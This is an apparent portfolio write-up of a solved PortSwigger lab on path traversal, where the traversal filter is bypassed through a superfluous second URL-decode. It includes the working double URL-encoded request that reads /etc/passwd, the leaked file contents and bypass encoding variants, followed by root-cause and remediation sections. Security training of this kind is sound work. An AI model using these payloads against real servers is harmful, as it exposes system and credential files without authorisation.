# File Path Traversal — Traversal Sequences Stripped with Superfluous URL-Decode

**PortSwigger Web Security Academy** | Topic: Path Traversal | Difficulty: Practitioner
**Status:** ✅ Solved

---

## Lab Description

This lab contains a path traversal vulnerability in the display of product images. The application **blocks input containing path traversal sequences**, but it then performs a **URL-decode of the input** before using it — after the sanitization check has already passed.

**Objective:** Retrieve the contents of `/etc/passwd`.

---

## Vulnerability Overview

The app's filter correctly rejects a request if the raw `filename` value contains an obvious traversal sequence like `../`. The flaw is *when* that check happens relative to decoding:

1. The web server / framework URL-decodes the request once automatically (standard HTTP behaviour).
2. The application's sanitization check runs against that already-decoded value, looking for `../`.
3. But the application then performs **a second, superfluous URL-decode** of the input before using it to build the file path.

If the traversal sequence is **URL-encoded**, the string the sanitizer inspects (`%2e%2e%2f`) doesn't look like `../` and passes the check. The application's own extra decode step then turns it into `../` right before it's used — recreating the exact payload the filter was meant to block.

Since one layer of decoding happens automatically and the sanitizer only sees the input *after* that layer, a **single URL-encode** would normally be caught (because the automatic decode already turns it into `../` before the check). To survive both the automatic decode *and* the sanitizer, the sequence needs to be encoded **twice** — i.e. **double URL-encoded**:

```
../   →  %2e%2e%2f   →  %252e%252e%252f
```

- The automatic decode turns `%252e%252e%252f` into `%2e%2e%2f` (still not `../`, so the filter passes it).
- The application's extra decode step then turns `%2e%2e%2f` into `../`.

---

## Methodology

### 1. Identify the vulnerable parameter
Burp's Proxy history shows the same pattern as the other labs — product images are loaded via:

```
GET /image?filename=30.jpg
```

### 2. Intercept and send to Repeater
The image request was intercepted in Burp Proxy and sent to **Repeater** for manipulation.

### 3. Confirm the filter blocks plain traversal
Sending a normal traversal payload (`../../../etc/passwd`) is rejected outright — the sanitizer catches it before any decoding occurs.

### 4. Bypass with double URL-encoding
Each `../` segment was replaced with its **double URL-encoded** form so it survives the automatic decode without triggering the traversal filter, then gets decoded into a real `../` by the application's own extra decode step:

```http
GET /image?filename=..%252f..%252f..%252f..%252fetc/passwd HTTP/2
Host: 0a8800f8030db25d80a9f36e003900b5.web-security-academy.net
Cookie: session=1ly90264d4Mo2xEfVP73i22NnDoKw7Vx
```

### 5. Result

The server returned a `200 OK` with the contents of `/etc/passwd`:

```http
HTTP/2 200 OK
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
...
```

The lab was marked **Solved**.

---

## Root Cause

The application validates input for traversal sequences **before** an additional, application-level URL-decode is applied — rather than validating the fully-decoded value that's actually used to build the file path. This mismatch between "what gets checked" and "what gets used" lets a double-encoded payload slip through: it looks harmless to the filter, but decodes into a live traversal sequence right before use.

---

## Evidence

| Step | Screenshot |
|---|---|
| Lab in "Not solved" state before the attack | `screenshots/01-lab-not-solved.png` |
| Burp Proxy intercept showing normal image requests | `screenshots/02-burp-proxy-intercept.png` |
| Repeater request with double URL-encoded traversal (`%252e%252e%252f` style) disclosing `/etc/passwd` | `screenshots/03-repeater-double-url-encode-bypass.png` |
| Lab in "Solved" state after the attack | `screenshots/04-lab-solved.png` |

---

## Remediation

- Validate input for traversal sequences **after** all decoding steps have been applied — ideally, decode fully first, then check the final, fully-decoded value exactly once.
- Avoid decoding user input more than once; if a framework already URL-decodes incoming parameters, don't add a second manual decode step downstream.
- Prefer allowlisting known-good filenames/identifiers over blacklisting bad patterns — a blacklist has to anticipate every encoding variant (single, double, non-standard like `%c0%af` or `%ef%bc%8f`), while an allowlist doesn't.
- Canonicalize the final resolved path and verify it remains within the intended base directory before opening the file, regardless of how the input was encoded.

---

## References

- [PortSwigger Web Security Academy – Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
